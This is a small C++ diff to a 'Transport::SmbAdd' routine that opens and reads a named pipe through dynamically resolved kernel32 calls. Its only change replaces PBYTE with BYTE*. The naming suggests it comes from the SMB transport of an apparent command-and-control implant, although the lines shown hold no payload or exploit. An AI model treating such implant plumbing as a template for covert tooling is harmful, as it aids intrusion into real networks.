@@ -12,7 +12,7 @@ auto Transport::SmbAdd(
 
     BOOL   Success = FALSE;
     ULONG  BuffLen = 0;
-    PBYTE  Buffer  = nullptr;
+    BYTE*  Buffer  = nullptr;
 
     HANDLE Handle  = Self->Krnl32.CreateFileA( 
         NamedPipe, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr 
@@ -36,7 +36,7 @@ auto Transport::SmbAdd(
 
             KhDbg( "%d available from named pipe", BuffLen );
 
-            Buffer = (PBYTE)Self->Hp->Alloc( BuffLen );
+            Buffer = (BYTE*)Self->Hp->Alloc( BuffLen );
 
             if ( Self->Krnl32.ReadFile( Handle, Buffer, BuffLen, &BuffLen, nullptr ) ) {
                 KhDbg( "read pipe buffer with success: %d", BuffLen ); break;
